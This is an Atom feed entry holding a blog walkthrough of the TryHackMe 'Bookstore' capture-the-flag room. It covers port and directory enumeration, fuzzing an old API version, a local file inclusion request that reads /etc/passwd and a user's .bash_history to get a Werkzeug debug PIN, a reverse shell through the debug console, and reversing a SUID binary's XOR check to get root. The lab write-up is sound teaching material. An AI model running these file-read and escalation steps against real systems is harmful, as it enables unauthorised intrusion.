@@ -1,0 +1,207 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title>Zane&#x27;s Notes - CTF</title>
+	<subtitle>Notes on infosec</subtitle>
+	<link href="https://zanefry.github.io/tags/ctf/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="https://zanefry.github.io"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2022-11-07T18:49:59-06:00</updated>
+	<id>https://zanefry.github.io/tags/ctf/atom.xml</id>
+	<entry xml:lang="en">
+		<title>TryHackMe Bookstore</title>
+		<published>2022-11-07T18:49:59-06:00</published>
+		<updated>2022-11-07T18:49:59-06:00</updated>
+		<link rel="alternate" href="https://zanefry.github.io/challenges/bookstore/" type="text/html"/>
+		<id>https://zanefry.github.io/challenges/bookstore/</id>
+		<content type="html">&lt;p&gt;&lt;strong&gt;Room Description:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A Beginner level box with basic web enumeration and REST API Fuzzing.&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
+&lt;p&gt;Let&#x27;s start with a quick port scan.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#191919;color:#f8f8f2;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;nmap&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -sC -sV&lt;&#x2F;span&gt;&lt;span&gt; bookstore.thm
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;PORT     STATE SERVICE VERSION
+&lt;&#x2F;span&gt;&lt;span&gt;22&#x2F;tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+&lt;&#x2F;span&gt;&lt;span&gt;| ssh-hostkey:
+&lt;&#x2F;span&gt;&lt;span&gt;|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
+&lt;&#x2F;span&gt;&lt;span&gt;|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
+&lt;&#x2F;span&gt;&lt;span&gt;|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
+&lt;&#x2F;span&gt;&lt;span&gt;80&#x2F;tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+&lt;&#x2F;span&gt;&lt;span&gt;|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)
+&lt;&#x2F;span&gt;&lt;span&gt;|_http-title: Book Store
+&lt;&#x2F;span&gt;&lt;span&gt;5000&#x2F;tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
+&lt;&#x2F;span&gt;&lt;span&gt;| http-robots.txt: 1 disallowed entry
+&lt;&#x2F;span&gt;&lt;span&gt;|_&#x2F;api &amp;lt;&#x2F;p&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;|_http-title: Home
+&lt;&#x2F;span&gt;&lt;span&gt;Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;It&#x27;s hosting two http servers, and the one on port 5000 has one entry
+in its &lt;code&gt;&#x2F;robots.txt&lt;&#x2F;code&gt;. Probably a REST API as the room description suggests. I also
+went on to scan all ports to no avail.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;port-80&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#port-80&quot; aria-label=&quot;Anchor link for: port-80&quot;&gt;🔗&lt;&#x2F;a&gt;Port 80&lt;&#x2F;h2&gt;
+&lt;p&gt;The site on port 80 is mostly empty with a few forms that aren&#x27;t connected to anything,
+but after a little searching I found an interesting comment in &lt;code&gt;&#x2F;login.html&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#191919;color:#f8f8f2;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -s&lt;&#x2F;span&gt;&lt;span&gt; bookstore.thm&#x2F;login.html &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff5e5e;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;grep &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fbe3bf;&quot;&gt;&amp;lt;!--&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!--Still Working on this page will add the backend support soon, also the debugger pin is inside sid&amp;#39;s bash history file --&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;I&#x27;m not sure what&#x27;s mean by the debugger pin yet, but we have a username: &lt;strong&gt;sid&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;port-5000&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#port-5000&quot; aria-label=&quot;Anchor link for: port-5000&quot;&gt;🔗&lt;&#x2F;a&gt;Port 5000&lt;&#x2F;h2&gt;
+&lt;p&gt;Nothing on the home page, let&#x27;s try directory enumeration.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#191919;color:#f8f8f2;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -s&lt;&#x2F;span&gt;&lt;span&gt; bookstore.thm:5000
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;title&amp;gt;Home&amp;lt;&#x2F;title&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;h1&amp;gt;Foxy REST API v2.0&amp;lt;&#x2F;h1&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;p&amp;gt;This is a REST API for science fiction novels.&amp;lt;&#x2F;p&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#191919;color:#f8f8f2;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;ffuf&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -u&lt;&#x2F;span&gt;&lt;span&gt; bookstore.thm:5000&#x2F;FUZZ&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -w &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;locate&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -r&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;common.txt)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;    &#x2F;&amp;#39;___\  &#x2F;&amp;#39;___\           &#x2F;&amp;#39;___\
+&lt;&#x2F;span&gt;&lt;span&gt;   &#x2F;\ \__&#x2F; &#x2F;\ \__&#x2F;  __  __  &#x2F;\ \__&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;   \ \ ,__\\ \ ,__\&#x2F;\ \&#x2F;\ \ \ \ ,__\
+&lt;&#x2F;span&gt;&lt;span&gt;    \ \ \_&#x2F; \ \ \_&#x2F;\ \ \_\ \ \ \ \_&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;     \ \_\   \ \_\  \ \____&#x2F;  \ \_\
+&lt;&#x2F;span&gt;&lt;span&gt;      \&#x2F;_&#x2F;    \&#x2F;_&#x2F;   \&#x2F;___&#x2F;    \&#x2F;_&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;v1.1.0
+&lt;&#x2F;span&gt;&lt;span&gt;________________________________________________
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;:: Method           : GET
+&lt;&#x2F;span&gt;&lt;span&gt;:: URL              : http:&#x2F;&#x2F;bookstore.thm:5000&#x2F;FUZZ
+&lt;&#x2F;span&gt;&lt;span&gt;:: Wordlist         : FUZZ: &#x2F;usr&#x2F;share&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;common.txt
+&lt;&#x2F;span&gt;&lt;span&gt;:: Follow redirects : false
+&lt;&#x2F;span&gt;&lt;span&gt;:: Calibration      : false
+&lt;&#x2F;span&gt;&lt;span&gt;:: Timeout          : 10
+&lt;&#x2F;span&gt;&lt;span&gt;:: Threads          : 40
+&lt;&#x2F;span&gt;&lt;span&gt;:: Matcher          : Response status: 200,204,301,302,307,401,403
+&lt;&#x2F;span&gt;&lt;span&gt;________________________________________________
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;api                     [Status: 200, Size: 825, Words: 82, Lines: 12]
+&lt;&#x2F;span&gt;&lt;span&gt;console                 [Status: 200, Size: 1985, Words: 411, Lines: 53]
+&lt;&#x2F;span&gt;&lt;span&gt;robots.txt              [Status: 200, Size: 45, Words: 5, Lines: 2]
+&lt;&#x2F;span&gt;&lt;span&gt;:: Progress: [4713&#x2F;4713] :: Job [1&#x2F;1] :: 188 req&#x2F;sec :: Duration: [0:00:25] :: Errors: 0 ::
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Navigating to &lt;code&gt;&#x2F;console&lt;&#x2F;code&gt; prompts us for a pin. Werkzeug must be a web console
+for debugging that was left in production in this fictional scenario. Maybe the
+REST API is vulnerable to LFI and we can read &lt;strong&gt;sid&lt;&#x2F;strong&gt;&#x27;s &lt;code&gt;.bash_history&lt;&#x2F;code&gt; file.&lt;&#x2F;p&gt;
+&lt;img src=&quot;console_locked.png&quot; height=350&#x2F;&gt;
+&lt;p&gt;Navigating to &lt;code&gt;&#x2F;api&lt;&#x2F;code&gt; shows documentation of an endpoint called &lt;code&gt;books&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#191919;color:#f8f8f2;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -s&lt;&#x2F;span&gt;&lt;span&gt; bookstore.thm:5000&#x2F;api &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff5e5e;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;html2text
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;****** API Documentation ******
+&lt;&#x2F;span&gt;&lt;span&gt;**** Since every good API has a documentation we have one as well! ****
+&lt;&#x2F;span&gt;&lt;span&gt;***** The various routes this API currently provides are: *****
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;api&#x2F;v2&#x2F;resources&#x2F;books&#x2F;all (Retrieve all books and get the output in a json format)
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;api&#x2F;v2&#x2F;resources&#x2F;books&#x2F;random4 (Retrieve 4 random records)
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;api&#x2F;v2&#x2F;resources&#x2F;books?id=1(Search by a specific parameter , id parameter)
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;api&#x2F;v2&#x2F;resources&#x2F;books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;api&#x2F;v2&#x2F;resources&#x2F;books?published=1993 (This query will return all the books published in the year 1993)
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;api&#x2F;v2&#x2F;resources&#x2F;books?author=J.K. Rowling&amp;amp;published=2003 (Search by a combination of 2 or more parameters)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;After a bunch of fuzzing and trying &lt;code&gt;sqlmap&lt;&#x2F;code&gt; with no results I thought to try changing &lt;code&gt;v2&lt;&#x2F;code&gt; to &lt;code&gt;v1&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#191919;color:#f8f8f2;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -I&lt;&#x2F;span&gt;&lt;span&gt; bookstore.thm:5000&#x2F;api&#x2F;v1&#x2F;resources&#x2F;books&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff5e5e;&quot;&gt;?&lt;&#x2F;span&gt;&lt;span&gt;id=1
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;HTTP&#x2F;1.0 200 OK
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;json
+&lt;&#x2F;span&gt;&lt;span&gt;Access-Control-Allow-Origin: *
+&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 237
+&lt;&#x2F;span&gt;&lt;span&gt;Server: Werkzeug&#x2F;0.14.1 Python&#x2F;3.6.9
+&lt;&#x2F;span&gt;&lt;span&gt;Date: Tue, 08 Nov 2022 21:22:52 GMT
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Looks like version 1 is still up. Let&#x27;s try fuzzing for parameters that aren&#x27;t listed in the documentation.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#191919;color:#f8f8f2;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;ffuf&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -u &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fbe3bf;&quot;&gt;http:&#x2F;&#x2F;bookstore.thm:5000&#x2F;api&#x2F;v1&#x2F;resources&#x2F;books?FUZZ=&#x2F;etc&#x2F;passwd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -w &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;locate&lt;&#x2F;span&gt;&lt;span&gt; actions-lowercase)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;        &#x2F;&amp;#39;___\  &#x2F;&amp;#39;___\           &#x2F;&amp;#39;___\
+&lt;&#x2F;span&gt;&lt;span&gt;       &#x2F;\ \__&#x2F; &#x2F;\ \__&#x2F;  __  __  &#x2F;\ \__&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;       \ \ ,__\\ \ ,__\&#x2F;\ \&#x2F;\ \ \ \ ,__\
+&lt;&#x2F;span&gt;&lt;span&gt;        \ \ \_&#x2F; \ \ \_&#x2F;\ \ \_\ \ \ \ \_&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;         \ \_\   \ \_\  \ \____&#x2F;  \ \_\
+&lt;&#x2F;span&gt;&lt;span&gt;          \&#x2F;_&#x2F;    \&#x2F;_&#x2F;   \&#x2F;___&#x2F;    \&#x2F;_&#x2F;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;v1.1.0
+&lt;&#x2F;span&gt;&lt;span&gt;________________________________________________
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;:: Method           : GET
+&lt;&#x2F;span&gt;&lt;span&gt;:: URL              : http:&#x2F;&#x2F;bookstore.thm:5000&#x2F;api&#x2F;v1&#x2F;resources&#x2F;books?FUZZ=&#x2F;etc&#x2F;passwd
+&lt;&#x2F;span&gt;&lt;span&gt;:: Wordlist         : FUZZ: &#x2F;usr&#x2F;share&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;api&#x2F;actions-lowercase.txt
+&lt;&#x2F;span&gt;&lt;span&gt;:: Follow redirects : false
+&lt;&#x2F;span&gt;&lt;span&gt;:: Calibration      : false
+&lt;&#x2F;span&gt;&lt;span&gt;:: Timeout          : 10
+&lt;&#x2F;span&gt;&lt;span&gt;:: Threads          : 40
+&lt;&#x2F;span&gt;&lt;span&gt;:: Matcher          : Response status: 200,204,301,302,307,401,403
+&lt;&#x2F;span&gt;&lt;span&gt;________________________________________________
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;show                    [Status: 200, Size: 1555, Words: 9, Lines: 31]
+&lt;&#x2F;span&gt;&lt;span&gt;:: Progress: [109&#x2F;109] :: Job [1&#x2F;1] :: 0 req&#x2F;sec :: Duration: [0:00:00] :: Errors: 0 ::&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Finally a vulnerable parameter, and upon further inspection it turns out to be the LFI foreshadowed by the comment in &lt;code&gt;&#x2F;login.html&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#191919;color:#f8f8f2;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fbe3bf;&quot;&gt;http:&#x2F;&#x2F;bookstore.thm:5000&#x2F;api&#x2F;v1&#x2F;resources&#x2F;books?show=&#x2F;home&#x2F;sid&#x2F;.bash_history&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;whoami
+&lt;&#x2F;span&gt;&lt;span&gt;export WERKZEUG_DEBUG_PIN=123-321-135
+&lt;&#x2F;span&gt;&lt;span&gt;echo $WERKZEUG_DEBUG_PIN
+&lt;&#x2F;span&gt;&lt;span&gt;python3 &#x2F;home&#x2F;sid&#x2F;api.py
+&lt;&#x2F;span&gt;&lt;span&gt;ls
+&lt;&#x2F;span&gt;&lt;span&gt;exit
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;With access to the python console we can simply paste some code from &lt;a href=&quot;https:&#x2F;&#x2F;revshells.com&quot;&gt;revshells.com&lt;&#x2F;a&gt; and get a shell.&lt;&#x2F;p&gt;
+&lt;img src=&quot;console_revshell.png&quot; height=350&#x2F;&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#local-privilege-escalation&quot; aria-label=&quot;Anchor link for: local-privilege-escalation&quot;&gt;🔗&lt;&#x2F;a&gt;Local Privilege Escalation&lt;&#x2F;h2&gt;
+&lt;p&gt;In &lt;strong&gt;sid&lt;&#x2F;strong&gt;&#x27;s home dir there&#x27;s a SUID binary owned by root. This must be the intended path for privilege escalation.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;sid@bookstore:~$ ls -l
+&lt;&#x2F;span&gt;&lt;span&gt;total 44
+&lt;&#x2F;span&gt;&lt;span&gt;-r--r--r-- 1 sid  sid  4635 Oct 20  2020 api.py
+&lt;&#x2F;span&gt;&lt;span&gt;-r-xr-xr-x 1 sid  sid   160 Oct 14  2020 api-up.sh
+&lt;&#x2F;span&gt;&lt;span&gt;-rw-rw-r-- 1 sid  sid 16384 Oct 19  2020 books.db
+&lt;&#x2F;span&gt;&lt;span&gt;-rwsrwsr-x 1 root sid  8488 Oct 20  2020 try-harder
+&lt;&#x2F;span&gt;&lt;span&gt;-r--r----- 1 sid  sid    33 Oct 15  2020 user.txt
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;What does it do?&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;sid@bookstore:~$ .&#x2F;try-harder
+&lt;&#x2F;span&gt;&lt;span&gt;What&amp;#39;s The Magic Number?!
+&lt;&#x2F;span&gt;&lt;span&gt;1337
+&lt;&#x2F;span&gt;&lt;span&gt;Incorrect Try Harder
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Seems like a reverse engineering challenge. I tried &lt;code&gt;strings&lt;&#x2F;code&gt;, &lt;code&gt;ltrace&lt;&#x2F;code&gt;, and &lt;code&gt;strace&lt;&#x2F;code&gt; before copying it to my machine,
+dropping it into IDA, and generating some C pseudocode.&lt;&#x2F;p&gt;
+&lt;img src=&quot;ida_screenshot.png&quot; height=300 style=&quot;margin-bottom: 20px&quot;&#x2F;&gt;
+&lt;p&gt;The germane part is this:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;C&quot; style=&quot;background-color:#191919;color:#f8f8f2;&quot; class=&quot;language-C &quot;&gt;&lt;code class=&quot;language-C&quot; data-lang=&quot;C&quot;&gt;&lt;span&gt;v6 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff5e5e;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdb082;&quot;&gt;23987&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;scanf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdb082;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff5e5e;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt;v5);
+&lt;&#x2F;span&gt;&lt;span&gt;v7 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff5e5e;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; v6 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff5e5e;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span&gt; v5 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff5e5e;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdb082;&quot;&gt;0x1116&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff5e5e;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(v7 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff5e5e;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdb082;&quot;&gt;1573724660&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;system&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fbe3bf;&quot;&gt;&#x2F;bin&#x2F;bash -p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The &lt;code&gt;^&lt;&#x2F;code&gt; symbol denotes the &lt;abbr title=&quot;Exclusive OR&quot;&gt;&lt;em&gt;XOR&lt;&#x2F;em&gt;&lt;&#x2F;abbr&gt; operation, which is easiest to explain visually to those unfamiliar:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;     1010110
+&lt;&#x2F;span&gt;&lt;span&gt; XOR 1101111
+&lt;&#x2F;span&gt;&lt;span&gt; -----------
+&lt;&#x2F;span&gt;&lt;span&gt;     0111001
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The result is &lt;code&gt;0&lt;&#x2F;code&gt; where the operands agree and &lt;code&gt;1&lt;&#x2F;code&gt; where they differ.
+If we assert &lt;code&gt;v7&lt;&#x2F;code&gt; is equal to the correct value to give us a root shell,
+and convert all numbers to hex, the xor expression can be rearranged to
+&lt;code&gt;0x1116 ^ 0x5db3 ^ 0x5dcd21f4 = v5&lt;&#x2F;code&gt;. The reason &lt;code&gt;v5&lt;&#x2F;code&gt; can be isolated this way
+is that xor is its own inverse. Then all that&#x27;s left to find the correct input
+is to compute the xor of these three terms.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#191919;color:#f8f8f2;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#e9fdac;&quot;&gt;python&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#fc9354;&quot;&gt; -c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fbe3bf;&quot;&gt;print(int(0x1116) ^ int(0x5db3) ^ int(0x5dcd21f4))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt;&amp;#39;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;1573743953
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Let&#x27;s try it.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#191919;color:#f8f8f2;&quot;&gt;&lt;code&gt;&lt;span&gt;sid@bookstore:~$ .&#x2F;try-harder
+&lt;&#x2F;span&gt;&lt;span&gt;What&amp;#39;s The Magic Number?!
+&lt;&#x2F;span&gt;&lt;span&gt;1573743953
+&lt;&#x2F;span&gt;&lt;span&gt;root@bookstore:~#
